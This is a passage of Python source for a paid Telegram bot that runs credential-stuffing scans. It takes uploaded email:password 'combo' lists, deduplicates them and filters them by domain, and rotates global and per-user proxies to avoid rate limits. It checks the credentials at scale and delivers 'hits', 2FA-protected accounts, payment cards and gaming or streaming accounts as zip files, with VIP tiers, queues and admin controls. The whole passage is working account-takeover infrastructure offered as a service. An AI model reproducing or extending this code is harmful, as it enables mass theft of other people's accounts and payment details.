    if not is_admin(update.effective_user.id): return
    if not context.args: return
    try:
        target_id = int(context.args[0])
        db = get_db()
        try:
            u = db.query(User).filter(User.telegram_id == target_id).first()
            if u:
                u.is_banned = False
                db.commit()
                await update.message.reply_text(f"✅ User `{target_id}` UNBANNED", parse_mode='Markdown')
        finally:
            db.close()
    except Exception:
        pass

async def broadcast_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    if not context.args:
        await update.message.reply_text("Usage: `/broadcast MESSAGE`", parse_mode='Markdown')
        return
    msg = ' '.join(context.args)
    db = get_db()
    try:
        users = db.query(User).filter(User.is_banned == False).all()
        sent = 0
        failed = 0
        for u in users:
            try:
                await context.bot.send_message(chat_id=u.telegram_id, text=f"📢 *Broadcast:*\n\n{msg}", parse_mode='Markdown')
                sent += 1
            except Exception:
                failed += 1
        await update.message.reply_text(f"📢 Broadcast sent!\n✅ Delivered: {sent}\n❌ Failed: {failed}")
    finally:
        db.close()

async def addlines_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    if len(context.args) < 2: return
    try:
        target_id = int(context.args[0])
        amount = int(context.args[1])
        db = get_db()
        try:
            u = db.query(User).filter(User.telegram_id == target_id).first()
            if u:
                u.daily_lines_bonus += amount
                db.commit()
                await update.message.reply_text(f"✅ Added {amount:,} bonus lines to user `{target_id}`", parse_mode='Markdown')
        finally:
            db.close()
    except Exception:
        pass

# ========== FILE HANDLER ==========

async def file_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    state = context.user_data.get('state')

    if not update.message or not update.message.document:
        return

    doc = update.message.document

    # Proxy upload (per-user)
    if state == 'upload_proxies':
        f = await context.bot.get_file(doc.file_id)
        path = os.path.join(tempfile.gettempdir(), f"{uid}_proxy_{int(time.time())}.txt")
        await f.download_to_drive(path)
        try:
            with open(path, 'r', errors='ignore') as fp:
                proxy_lines = [l.strip() for l in fp if l.strip() and not l.startswith('#')]
        finally:
            os.remove(path)

        db = get_db()
        try:
            added = 0
            for pl in proxy_lines:
                exists = db.query(Proxy).filter(Proxy.user_id == uid, Proxy.proxy_string == pl).first()
                if not exists:
                    db.add(Proxy(user_id=uid, proxy_string=pl))
                    added += 1
            db.commit()
            total = db.query(Proxy).filter(Proxy.user_id == uid, Proxy.is_active == True).count()
        finally:
            db.close()

        await update.message.reply_text(f"✅ *Proxies Uploaded!*\n\n📊 Added: {added}\n📊 Total Active: {total}", parse_mode='Markdown')
        context.user_data['state'] = None
        return

    # Global proxy upload (admin only)
    if state == 'upload_global_proxies' and is_admin(uid):
        f = await context.bot.get_file(doc.file_id)
        path = os.path.join(tempfile.gettempdir(), f"global_proxy_{int(time.time())}.txt")
        await f.download_to_drive(path)
        try:
            with open(path, 'r', errors='ignore') as fp:
                proxy_lines = [l.strip() for l in fp if l.strip() and not l.startswith('#')]
        finally:
            os.remove(path)

        added = global_proxy_manager.add_proxies(proxy_lines)
        global_proxy_manager.save_to_file(GLOBAL_PROXY_FILE)
        ps = global_proxy_manager.stats()

        await update.message.reply_text(
            f"✅ *Global Proxies Uploaded!*\n\n"
            f"📊 Added: {added}\n"
            f"📊 Total: {ps['total']}\n"
            f"✅ Available: {ps['available']}\n\n"
            f"All users now use these proxies!",
            parse_mode='Markdown'
        )
        context.user_data['state'] = None
        return

    # Keyword file upload
    if state == 'upload_keywords':
        f = await context.bot.get_file(doc.file_id)
        path = os.path.join(tempfile.gettempdir(), f"{uid}_kw_{int(time.time())}.txt")
        await f.download_to_drive(path)
        try:
            with open(path, 'r', errors='ignore') as fp:
                new_kws = [l.strip().lower() for l in fp if l.strip()]
        finally:
            os.remove(path)

        existing = get_keywords(context, uid)
        existing.extend(new_kws)
        set_keywords(context, uid, list(set(existing)))
        await update.message.reply_text(f"✅ Added {len(new_kws)} keywords! Total: {len(set(existing))}")
        context.user_data['state'] = None
        return

    # Combo file upload - ALWAYS accept .txt files
    file_name = doc.file_name or ''
    is_txt = file_name.lower().endswith('.txt')
    is_special_state = state in ('upload_proxies', 'upload_global_proxies', 'upload_keywords')

    if not is_special_state:
        if not is_txt:
            await update.message.reply_text("❌ Please send a .txt file!")
            return

        # Check file size (max 5MB)
        if doc.file_size and doc.file_size > MAX_FILE_SIZE_BYTES:
            await update.message.reply_text(
                f"❌ *File too large!*\n\n"
                f"Max size: {MAX_FILE_SIZE_MB}MB\n"
                f"Your file: {doc.file_size / 1024 / 1024:.1f}MB\n\n"
                f"Split your file and try again.",
                parse_mode='Markdown'
            )
            return

        # Check if user is banned
        db_user = get_or_create_user(uid)
        if db_user.is_banned:
            await update.message.reply_text("🚫 Your account is banned!")
            return

        f = await context.bot.get_file(doc.file_id)
        path = os.path.join(tempfile.gettempdir(), f"{uid}_combo_{int(time.time())}.txt")
        await f.download_to_drive(path)
        try:
            # Fast read with latin-1 fallback for speed
            try:
                with open(path, 'r', encoding='utf-8', errors='ignore') as fp:
                    raw_lines = [l.strip() for l in fp if l.strip()]
            except Exception:
                with open(path, 'r', encoding='latin-1', errors='ignore') as fp:
                    raw_lines = [l.strip() for l in fp if l.strip()]
        except Exception:
            await update.message.reply_text("❌ Error reading file!")
            return
        finally:
            if os.path.exists(path):
                os.remove(path)

        # Smart detect: PROXY file vs COMBO file
        combo_lines = [l for l in raw_lines if ':' in l and '@' in l.split(':')[0]]
        non_combo = [l for l in raw_lines if ':' in l and '@' not in l.split(':')[0]]

        # If NO email:pass lines found but has ip:port lines = proxy file
        if len(combo_lines) == 0 and len(non_combo) > 0:
            if is_admin(uid):
                added = global_proxy_manager.add_proxies(raw_lines)
                global_proxy_manager.save_to_file(GLOBAL_PROXY_FILE)
                ps = global_proxy_manager.stats()
                await update.message.reply_text(
                    f"🌐 *Detected proxy file!*\n\n"
                    f"📊 Added: {added} proxies\n"
                    f"📊 Total: {ps['total']}\n"
                    f"✅ Available: {ps['available']}",
                    parse_mode='Markdown'
                )
            else:
                await update.message.reply_text(
                    "🌐 This looks like a proxy file.\n"
                    "Only admins can upload global proxies.",
                    parse_mode='Markdown'
                )
            return

        lines = combo_lines if combo_lines else [l for l in raw_lines if ':' in l]

        if not lines:
            await update.message.reply_text(
                f"❌ *No valid accounts found!*\n\n"
                f"📊 Total lines: {len(raw_lines)}\n"
                f"✅ Valid: 0\n"
                f"⏩ Skipped: {len(raw_lines)}\n\n"
                f"Format: email:password\n"
                f"(One account per line)",
                parse_mode='Markdown'
            )
            return

        if context.user_data.get('multi'):
            if 'combo_lines' not in context.user_data:
                context.user_data['combo_lines'] = []
            context.user_data['combo_lines'].extend(lines)
            context.user_data['file_count'] = context.user_data.get('file_count', 0) + 1
            total = len(context.user_data['combo_lines'])

            await update.message.reply_text(
                f"📦 *File received!*\n\n"
                f"📁 {esc_md(file_name)}\n"
                f"📊 Valid lines: {len(lines)}\n"
                f"📊 Total loaded: {total}\n\n"
                f"⏱️ Send another file in 3 seconds to merge.\n"
                f"🚀 Or type /startscan to start immediately",
                parse_mode='Markdown'
            )
            context.user_data['file_load_time']  = time.time()
            context.user_data['file_line_count']  = total

            async def _auto_start_multi():
                await asyncio.sleep(3)
                current_lines = context.user_data.get('combo_lines', [])
                current_count = context.user_data.get('file_line_count', 0)
                if len(current_lines) == current_count and current_lines:
                    await _do_scan(update, context)
            asyncio.create_task(_auto_start_multi())
        else:
            context.user_data['combo_lines'] = lines
            context.user_data['last_filename'] = file_name
            context.user_data['file_load_time'] = time.time()
            context.user_data['file_line_count'] = len(lines)

            await update.message.reply_text(
                f"📦 *File received!*\n\n"
                f"📁 {esc_md(file_name)}\n"
                f"🗂️ Valid lines: `{len(lines):,}`\n\n"
                f"⏱️ Scan starts in *3 seconds*...\n"
                f"📎 Send another file now to merge it.",
                parse_mode='Markdown'
            )

            # Auto-start after 3 seconds if no new file sent
            async def _auto_start():
                await asyncio.sleep(3)
                current_count = context.user_data.get('file_line_count', 0)
                current_lines = context.user_data.get('combo_lines', [])
                # Only start if same file, not already scanning, not manually started
                if (len(current_lines) == current_count and current_lines
                        and not context.user_data.get('scan_started', False)):
                    context.user_data['scan_started'] = True
                    await _do_scan(update, context)

            asyncio.create_task(_auto_start())

# ========== SCAN COMMANDS ==========

async def _do_scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Shared scan execution."""
    try:
        await _do_scan_inner(update, context)
    except Exception as e:
        import traceback as _tb
        logger.error(f"_do_scan crash: {e}\n{_tb.format_exc()}")
        err_msg = str(e)[:300] if str(e) else type(e).__name__
        try:
            await update.message.reply_text(
                f"❌ *Scan crashed:*\n`{err_msg}`\n\nPlease upload your file again.",
                parse_mode='Markdown'
            )
        except Exception:
            pass


async def _do_scan_inner(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid     = update.effective_user.id
    lines   = context.user_data.get('combo_lines', [])

    if not lines:
        await update.message.reply_text("❌ No combo lines loaded! Upload a file first.")
        return

    if uid in active_scans:
        await update.message.reply_text("❌ You already have an active scan! Use /stop first.")
        return

    db_user = get_or_create_user(uid)

    if db_user.is_banned:
        await update.message.reply_text("🚫 Your account is banned.")
        return

    p           = get_plan(db_user)
    mode        = db_user.current_mode
    session_max = p.get('session_max', 2000)

    # ── Step 1: Smart deduplicate + parse (handles all combo formats) ───
    lines, dupe_count = deduplicate_combos(lines)

    # ── Step 2: Domain filter for MS modes ────────────────────────────────
    lines, skipped_domain = filter_combos_by_mode(lines, mode)
    total_original = len(lines) + skipped_domain

    # ── Step 3: Daily limit check — cap to remaining lines ────────────────
    rem = p["daily"] - db_user.daily_lines_used + db_user.daily_lines_bonus
    if rem < 999999:
        if rem <= 0:
            await update.message.reply_text(
                f"❌ *Daily Limit Reached*\n\n"
                f"You've used all {p['daily']:,} lines today.\n"
                f"Resets at midnight UTC.\n\n"
                f"💎 Upgrade for unlimited: /start → 👑 Membership",
                parse_mode='Markdown'
            )
            return
        if len(lines) > rem:
            lines = lines[:rem]
            await update.message.reply_text(
                f"⚠️ *Daily Limit: Trimmed to {rem:,} lines*\n\n"
                f"Trimmed to `{rem:,}` daily lines remaining.\n"
                f"Checking first `{rem:,}` lines.",
                parse_mode='Markdown'
            )

    # ── Step 4: Session cap — store overflow for /resume ──────────────────
    remaining_lines = []
    if len(lines) > session_max:
        remaining_lines = lines[session_max:]
        lines           = lines[:session_max]
        context.user_data['remaining_lines'] = remaining_lines
        can_resume = p.get('resume', False)
        if can_resume:
            resume_note = f"\n\n✅ `/resume` available — {len(remaining_lines):,} lines queued."
        else:
            resume_note = (
                f"\n\n🔒 `/resume` is VIP only.\n"
                f"Remaining `{len(remaining_lines):,}` lines will be dropped.\n"
                f"💎 Upgrade to keep checking: /start → 👑 Membership"
            )
            remaining_lines = []  # free users don't get resume
            context.user_data['remaining_lines'] = []

        # Notify summary
        notify_parts = [f"📊 *{len(lines) + len(remaining_lines) + (0 if can_resume else len(remaining_lines)):,}* combos loaded"]
        if dupe_count:       notify_parts.append(f"🔄 `{dupe_count:,}` duplicates removed")
        if skipped_domain:   notify_parts.append(f"⏭️ `{skipped_domain:,}` wrong domain skipped")
        notify_parts.append(f"⚙️ Checking first `{len(lines):,}` lines now")
        if remaining_lines:  notify_parts.append(f"📦 `{len(remaining_lines):,}` queued for /resume")
        await update.message.reply_text(
            "\n".join(notify_parts) + resume_note,
            parse_mode='Markdown'
        )
    else:
        context.user_data['remaining_lines'] = []
        # Show dedup/filter summary if anything was removed
        if dupe_count or skipped_domain:
            parts = [f"📊 `{len(lines):,}` combos ready"]
            if dupe_count:     parts.append(f"🔄 `{dupe_count:,}` dupes removed")
            if skipped_domain: parts.append(f"⏭️ `{skipped_domain:,}` wrong domain skipped")
            await update.message.reply_text("\n".join(parts), parse_mode='Markdown')

    if not lines:
        await update.message.reply_text("❌ No valid combos after filtering. Check your file format and domain.")
        return

    # ── Step 5: Queue system ─────────────────────────────────────────────────
    if p.get('queue', False) and len(active_scans) >= MAX_QUEUE_FREE:
        queue_size = len(active_scans)
        pos        = queue_size + 1
        est_wait   = queue_size * 45  # ~45s avg per scan

        queue_msg = await update.message.reply_text(
            f"⏳ *Queue Position: #{pos}*\n\n"
            f"🔄 Active scans: `{queue_size}`\n"
            f"⏱️ Estimated wait: ~`{est_wait}s`\n\n"
            f"Your scan will start automatically when a slot opens.\n"
            f"💎 VIP users skip the queue instantly.",
            parse_mode='Markdown'
        )

        # Wait for a slot — update user every 10s
        waited  = 0
        max_wait = 600  # 10 min max wait
        while len(active_scans) >= MAX_QUEUE_FREE and waited < max_wait:
            await asyncio.sleep(10)
            waited += 10
            remaining_wait = max(0, est_wait - waited)
            pos_now = len(active_scans) + 1
            try:
                await queue_msg.edit_text(
                    f"⏳ *Queue Position: #{pos_now}*\n\n"
                    f"🔄 Active scans: `{len(active_scans)}`\n"
                    f"⏱️ Waited: `{waited}s`\n\n"
                    f"Your scan will start automatically...",
                    parse_mode='Markdown'
                )
            except Exception:
                pass

        if len(active_scans) >= MAX_QUEUE_FREE:
            await update.message.reply_text(
                "❌ Queue timeout after 10 minutes.\n"
                "Try /startscan again — a slot may be free now."
            )
            return

        # Slot opened — notify user
        try:
            await queue_msg.edit_text("✅ *Slot opened — starting your scan now!*", parse_mode='Markdown')
        except Exception:
            await update.message.reply_text("✅ Starting your scan now!")

    mode = db_user.current_mode
    threads = db_user.current_threads
    session_id = f"{uid}_{int(time.time())}"

    # Priority member check
    priority = "👑 Priority member!" if db_user.plan != "free" else ""

    # Loading message
    await update.message.reply_text(
        f"📊 {len(lines)} accounts loaded.\n\n"
        f"⚙️ Starting scan... {priority}",
        parse_mode='Markdown'
    )

    # Create engine with global proxy manager
    keywords = get_keywords(context, uid) or []

    # Load user's personal proxies as fallback proxy rotator
    db_user_proxies = []
    db2 = get_db()
    try:
        from core.proxy_manager import GlobalProxyManager, ProxyInfo
        user_proxies = db2.query(Proxy).filter(
            Proxy.user_id == uid,
            Proxy.is_active == True
        ).all()
        if user_proxies:
            user_pm = GlobalProxyManager()
            user_pm.load_from_list([p.proxy_string for p in user_proxies], clear=True)
        else:
            user_pm = None
    finally:
        db2.close()

    # Smart proxy routing: use global pool unless depleted, then fall back to user proxies
    class SmartProxyRotator:
        def __init__(self, global_pm, user_pm, plan):
            self.global_pm = global_pm
            self.user_pm   = user_pm
            self.plan      = plan
        def get_next(self):
            ps = self.global_pm.stats()
            # If global pool healthy, use it with plan-based priority
            if ps['available'] >= 5:
                p = self.global_pm.get_proxy_for_user(self.plan)
                if p:
                    return p
            # Fallback to user's personal proxies
            if self.user_pm and self.user_pm.count_available() > 0:
                return self.user_pm.get_next()
            # Last resort — any global proxy even if rate-limited
            return self.global_pm.get_next()
        def count(self):
            g = self.global_pm.count_available()
            u = self.user_pm.count_available() if self.user_pm else 0
            return g + u
        def stats(self):
            s = self.global_pm.stats()
            if self.user_pm:
                s['user_proxies'] = self.user_pm.count_available()
            return s
        def mark_result(self, proxy_url, success, ms=0, domain=''):
            self.global_pm.mark_result(proxy_url, success, ms, domain)

    smart_rotator = SmartProxyRotator(global_proxy_manager, user_pm, db_user.plan)

    engine = CheckerEngine(
        session_id=session_id,
        mode=mode,
        threads=threads,
        lines=lines,
        proxy_rotator=smart_rotator,
        keywords=keywords
    )
    engine._user_plan = db_user.plan
    active_scans[uid] = engine

    # Get filename
    scan_filename = esc_md(context.user_data.get('last_filename', 'combo.txt'))
    context.user_data['scan_filename'] = scan_filename  # persist for _send_results

    # Send scan started message
    msg = await update.message.reply_text(
        f"🗂️ {fmt(len(lines))} accounts loaded.\n\n"
        f"⚙️ Starting scan...\n"
        f"📄 File: {scan_filename}\n"
        f"🔢 Mode: {get_mode_name(mode)}\n"
        f"🧵 Threads: {threads}",
        parse_mode='Markdown'
    )

    # Start engine in background thread
    def run_engine():
        engine.start()

    t = threading.Thread(target=run_engine, daemon=True)
    t.start()

    # Live stats updater
    # ── Proxy check — warn user if pool is low ────────────────────────────
    ps = global_proxy_manager.stats()
    if ps['total'] == 0:
        await update.message.reply_text(no_proxies_msg(), parse_mode='Markdown')
    # Note: low proxy warning removed — residential proxies managed by admin

    # ── Daily limit warning at 80% ─────────────────────────────────────────
    p = get_plan(db_user)
    daily_limit = p['daily']
    if daily_limit < 999999:
        used_pct = db_user.daily_lines_used / max(daily_limit, 1)
        if used_pct >= 0.8:
            await update.message.reply_text(
                daily_limit_warning_msg(db_user.daily_lines_used, daily_limit, db_user.plan),
                parse_mode='Markdown'
            )

    # ── Upgrade nudge at 60% for free users ────────────────────────────────
    if db_user.plan == 'free' and daily_limit < 999999:
        used_pct = db_user.daily_lines_used / max(daily_limit, 1)
        # upgrade nudge removed
    async def updater():
        last_hit_count = 0
        plan_supports_rt = p.get('real_time_hits', False)
        await asyncio.sleep(2)  # Give engine time to load queue before first check

        while uid in active_scans:
            await asyncio.sleep(3)
            if engine.is_finished():
                break
            s = engine.get_stats()

            # Update progress message with smart formatting
            try:
                if engine.start_time:
                    elapsed_now = (datetime.now() - engine.start_time).total_seconds()
                    dur_str = f"{int(elapsed_now//60)}m {int(elapsed_now%60)}s" if elapsed_now >= 60 else f"{int(elapsed_now)}s"
                    await msg.edit_text(
                        scan_progress_msg(s, scan_filename, get_mode_name(mode), dur_str),
                        parse_mode='Markdown'
                    )
            except Exception:
                pass

            # Real-time hit alerts for VIP users
            if plan_supports_rt:
                current_hits = engine.results.get('hits', [])
                new_hits = current_hits[last_hit_count:]
                for hit in new_hits[:5]:  # max 5 alerts per cycle
                    try:
                        await context.bot.send_message(
                            uid,
                            real_time_hit_msg(hit),
                            parse_mode='Markdown'
                        )
                    except Exception:
                        pass
                last_hit_count = len(current_hits)

            # Proxy rate limit check during scan
            # Proxy mid-scan warning removed — residential proxies self-managed

        # Auto-complete if engine finished on its own
        if uid in active_scans:
            await _send_results(uid, context, msg.chat_id)

    asyncio.create_task(updater())
    context.user_data['state'] = None
    context.user_data['combo_lines'] = []

async def _send_results(uid: int, context: ContextTypes.DEFAULT_TYPE, chat_id: int):
    """Send scan results"""
    if uid not in active_scans:
        return

    engine = active_scans[uid]
    s = engine.get_stats()
    elapsed = (datetime.now() - engine.start_time).total_seconds() if engine.start_time else 0
    elapsed_str = f"{int(elapsed // 60)} min" if elapsed > 60 else f"{int(elapsed)}s"

    # Send completion message
    rate = (s['hits'] / max(s['total'], 1)) * 100
    extras_complete = []
    if s.get('xgpu'):              extras_complete.append(f"⭐ XGPU: {s['xgpu']}")
    if s.get('xgp'):               extras_complete.append(f"🎮 XGP: {s['xgp']}")
    if s.get('minecraft'):         extras_complete.append(f"⛏️ MC: {s['minecraft']}")
    if s.get('capes'):             extras_complete.append(f"🧣 Capes: {s['capes']}")
    if s.get('payment'):           extras_complete.append(f"💳 Cards: {s['payment']}")
    if s.get('crunchyroll_premium'): extras_complete.append(f"🍥 CR: {s['crunchyroll_premium']}")
    if s.get('supercell'):         extras_complete.append(f"🎮 SC: {s['supercell']}")
    if s.get('roblox'):            extras_complete.append(f"🎮 Roblox: {s['roblox']}")
    extras_str = "\n" + "\n".join(extras_complete) if extras_complete else ""
    await context.bot.send_message(
        chat_id=chat_id,
        text=(
            f"✅ *Scan Completed!*\n\n"
            f"📁 File: {context.user_data.get('scan_filename', 'combo.txt')}\n"
            f"🗂️ Total: {s['total']:,}\n\n"
            f"✅ HIT: {s['hits']}\n"
            f"🔒 2FA: {s['twofa']}\n"
            f"❌ BAD: {s['bad']}\n"
            f"⚠️ ERROR: {s['errors']}"
            f"{extras_str}\n\n"
            f"⏱️ Duration: {elapsed_str}\n"
            f"⚡ Average CPM: {s['cpm']:,}\n\n"
            f"📤 Sending results..."
        ),
        parse_mode='Markdown'
    )

    # Save and send ONE zip — hits + 2fa + service files only
    folder = f"results/{uid}_{int(time.time())}"
    files  = engine.save_results_to_files(folder)
    bot_me = await context.bot.get_me()

    def _dl(fp):
        try:
            ls = open(fp, encoding='utf-8', errors='replace').readlines()
            return [l.rstrip() for l in ls[2:] if l.strip()]
        except Exception: return []

    import zipfile as _zf, io as _io
    SKIP = {'Capture.txt', 'Bad.txt'}
    zip_buf    = _io.BytesIO()
    total_files = 0
    hit_count   = s['hits']
    tfa_count   = s['twofa']
    bad_count   = s['bad']

    with _zf.ZipFile(zip_buf, 'w', _zf.ZIP_DEFLATED) as zf:
        for fp in sorted(files):
            if os.path.basename(fp) in SKIP: continue
            dl = _dl(fp)
            if not dl: continue
            rel = os.path.relpath(fp, folder).replace('\\', '/')
            zf.writestr(rel, '\n'.join(dl))
            total_files += 1

    if total_files > 0:
        zip_buf.seek(0)
        ts  = datetime.now().strftime('%Y%m%d_%H%M%S')
        try:
            await context.bot.send_document(
                chat_id=chat_id,
                document=zip_buf,
                filename=f"Results_{hit_count}Hits_{ts}.zip",
                caption=(
                    f"✅ *{hit_count}x Hotmail Hit*\n"
                    f"📊 Toplam Hit: `{hit_count}`\n"
                    f"🔒 2FA: `{tfa_count}`\n"
                    f"❌ BAD: `{bad_count}`\n\n"
                    f"🔥 Hit By: @{bot_me.username}"
                ),
                parse_mode='Markdown'
            )
        except Exception as e:
            logger.error(f"Zip send error: {e}")


    await context.bot.send_message(
        chat_id=chat_id,
        text=(
            f"✅ *RESULTS SENT!*\n\n"
            f"📁 Files:\n"
            f"• hit.txt - {s['hits']} accounts\n"
            f"• 2fa.txt - {s['twofa']} accounts\n\n"
            f"Files will be auto-deleted in 1 hour."
        ),
        parse_mode='Markdown'
    )

    # Update user stats
    db = get_db()
    try:
        u = db.query(User).filter(User.telegram_id == uid).first()
        if u:
            u.total_scans += 1
            u.total_hits += s['hits']
            u.total_lines_checked += s['checked']
            u.daily_lines_used += s['checked']
            db.commit()
    finally:
        db.close()

    del active_scans[uid]
    context.user_data['scan_started']   = False
    context.user_data['combo_lines']    = []
    context.user_data['last_filename']  = ''
    context.user_data['file_load_time'] = 0
    context.user_data['file_line_count']= 0

async def startscan_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid in active_scans:
        await update.message.reply_text(
            "⚡ Scan already running!\n/pause to pause · /stop to stop",
            parse_mode='Markdown'
        )
        return
    context.user_data['scan_started'] = True
    await _do_scan(update, context)

async def startmulti_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await _do_scan(update, context)

async def pause_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in active_scans:
        await update.message.reply_text("❌ No active scan to pause!")
        return
    active_scans[uid].pause()
    await update.message.reply_text("⏸️ *Scan Paused*\n\nUse /resume to continue", parse_mode='Markdown')

async def resume_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Resume remaining lines from previous scan (VIP feature)"""
    uid = update.effective_user.id

    if uid in active_scans:
        # Resume paused scan
        active_scans[uid].resume()
        await update.message.reply_text("▶️ *Scan Resumed*", parse_mode='Markdown')
        return

    # Check for remaining lines from session limit
    remaining = context.user_data.get('remaining_lines', [])
    if not remaining:
        await update.message.reply_text("❌ No remaining lines to resume!")
        return

    db_user = get_or_create_user(uid)
    p = get_plan(db_user)

    if not p.get('resume', False):
        await update.message.reply_text(
            "❌ */resume* is a VIP feature!\n\n"
            "Free plan can only check first 3,000 lines per upload.\n\n"
            "💎 Upgrade to VIP to unlock /resume!\n"
            "/start → 👑 Membership",
            parse_mode='Markdown'
        )
        return

    # Load remaining lines and scan
    context.user_data['combo_lines'] = remaining
    context.user_data['remaining_lines'] = []
    await _do_scan(update, context)

async def stop_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in active_scans:
        await update.message.reply_text("❌ No active scan to stop!")
        return
    active_scans[uid].stop()
    await _send_results(uid, context, update.message.chat_id)

async def cancel_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['state'] = None
    context.user_data.pop('combo_lines', None)
    context.user_data.pop('multi', None)
    await update.message.reply_text("❌ Cancelled.")

# ========== TEXT MESSAGE HANDLER ==========

async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    state = context.user_data.get('state')
    text = update.message.text.strip()

    if state == 'set_threads':
        try:
            val = int(text)
            db_user = get_or_create_user(uid)
            p = get_plan(db_user)
            if val < 100: val = 100
            if val > p["threads"]: val = p["threads"]
            db = get_db()
            try:
                u = db.query(User).filter(User.telegram_id == uid).first()
                if u:
                    u.current_threads = val
                    db.commit()
            finally:
                db.close()
            await update.message.reply_text(f"✅ Threads set to: *{val}*", parse_mode='Markdown')
            context.user_data['state'] = None
        except Exception:
            await update.message.reply_text("❌ Please enter a valid number!")

    elif state == 'add_keywords':
        kws = [k.strip().lower() for k in text.split(',') if k.strip()]
        existing = get_keywords(context, uid)
        existing.extend(kws)
        set_keywords(context, uid, list(set(existing)))
        await update.message.reply_text(f"✅ Added {len(kws)} keywords! Total: {len(set(existing))}")
        context.user_data['state'] = None

# ========== SHORTCUT COMMANDS (matching Orbit's /help) ==========

def _is_scanning(uid: int) -> bool:
    return uid in active_scans


async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show all commands"""
    text = (
        "📚 *COMMANDS LIST*\n\n"
        "🎯 *Scan Commands:*\n"
        "/start - Main menu\n"
        "/scan - Start single scan\n"
        "/multi - Multi-scan (combine files)\n"
        "/startscan - Start loaded scan\n"
        "/startmulti - Start multi-scan\n"
        "/pause - Pause active scan\n"
        "/resume - Resume paused/queued scan\n"
        "/stop - Stop scan and send results\n"
        "/cancel - Cancel current operation\n\n"
        "⚙️ *Settings Commands:*\n"
        "/settings - Settings menu\n"
        "/apimode - Change checker mode\n"
        "/threads - Set thread count\n"
        "/keywords - Keyword management\n"
        "/linkmod - Toggle link mode\n"
        "/lang - Change language\n\n"
        "📊 *Info Commands:*\n"
        "/stats - My statistics\n"
        "/mystats - Detailed personal stats card\n"
        "/topmode - Best performing modes this week\n"
        "/history - Last 5 scans\n"
        "/leaderboard - Weekly top 10\n"
        "/membership - Membership plans\n"
        "/referrals - My referral link\n"
        "/queue - Queue status\n"
        "/status - Bot health status\n"
        "/setwebhook - Set Discord webhook (VIP)\n"
        "/support - Support & contact\n"
        "/help - Show this message\n\n"
        "💡 *Tip:* All commands accessible from main menu too!"
    )
    await update.message.reply_text(text, parse_mode='Markdown')

async def scan_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start scan - shortcut for /startscan"""
    db_user = get_or_create_user(update.effective_user.id)
    mode = db_user.current_mode
    context.user_data['state'] = 'waiting_combo'
    context.user_data['multi'] = False
    text = (
        f"📂 *Start Scan*\n\n"
        f"🔢 API Mode: *{get_mode_name(mode)}*\n"
        f"🧵 Threads: *{db_user.current_threads}*\n"
        f"🔑 Keywords: *{len(get_keywords(context, update.effective_user.id))}*\n\n"
        f"📤 Send your combo list (.txt file)\n\n"
        f"Format: email:password (one per line)\n\n"
        f"Cancel with /cancel"
    )
    await update.message.reply_text(text, parse_mode='Markdown')

async def multi_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Multi-scan shortcut"""
    db_user = get_or_create_user(update.effective_user.id)
    p = get_plan(db_user)
    mode = db_user.current_mode
    context.user_data['state'] = 'waiting_combo'
    context.user_data['multi'] = True
    context.user_data['combo_lines'] = []
    context.user_data['file_count'] = 0
    text = (
        f"📦 *Multi-Scan Mode*\n\n"
        f"Upload 2-{p['files']} .txt files, they will be combined.\n\n"
        f"⚙️ *Your Settings:*\n"
        f"🔢 API Mode: {get_mode_name(mode)}\n"
        f"🧵 Threads: {db_user.current_threads}\n"
        f"📊 Max Files: {p['files']}\n\n"
        f"📤 Send your files now!\n"
        f"✅ After uploading, type /startscan\n"
        f"❌ Cancel with /cancel"
    )
    await update.message.reply_text(text, parse_mode='Markdown')

async def settings_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Settings shortcut"""
    uid = update.effective_user.id
    db_user = get_or_create_user(uid)
    kws = get_keywords(context, uid)
    text = (
        f"⚙️ *Settings*\n\n"
        f"🔢 *API Mode:* {get_mode_name(db_user.current_mode)}\n"
        f"🧵 *Threads:* {db_user.current_threads}\n"
        f"🔑 *Keywords:* {len(kws)} active\n"
        f"🔗 *Link Mode:* OFF ❌\n"
        f"📢 *Channel Send:* OFF ❌"
    )
    kb = [
        [InlineKeyboardButton("🔢 API Mode", callback_data="api_mode")],
        [InlineKeyboardButton("🧵 Set Threads", callback_data="set_threads")],
        [InlineKeyboardButton("🔑 Keywords", callback_data="keywords_menu")],
        [InlineKeyboardButton("🌐 Proxy Settings", callback_data="proxy_settings")],
        [InlineKeyboardButton("🔙 Main Menu", callback_data="main_menu")]
    ]
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')

async def apimode_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """API mode shortcut"""
    text = "🔢 *API Mode Selection*\n\n"
    for mid, mdata in API_MODES.items():
        vip_tag = " _(VIP Only)_" if mdata.get('vip') else ""
        text += f"{mid}. *{mdata['name']}*{vip_tag}\n{mdata['desc']}\n\n"
    text += "⚡ Mode 7 recommended for 2k+ CPM!"
    kb = [
        [InlineKeyboardButton("🔥 All-in-One", callback_data="setmode_1")],
        [InlineKeyboardButton("🎮 Supercell", callback_data="setmode_2")],
        [InlineKeyboardButton("🎮 Roblox", callback_data="setmode_3")],
        [InlineKeyboardButton("🎮 Xbox", callback_data="setmode_4")],
        [InlineKeyboardButton("📱 TikTok", callback_data="setmode_5")],
        [InlineKeyboardButton("📊 Full Scan", callback_data="setmode_6")],
        [InlineKeyboardButton("🚀 Speed Mode", callback_data="setmode_7")],
        [InlineKeyboardButton("⛏️ Minecraft", callback_data="setmode_8")],
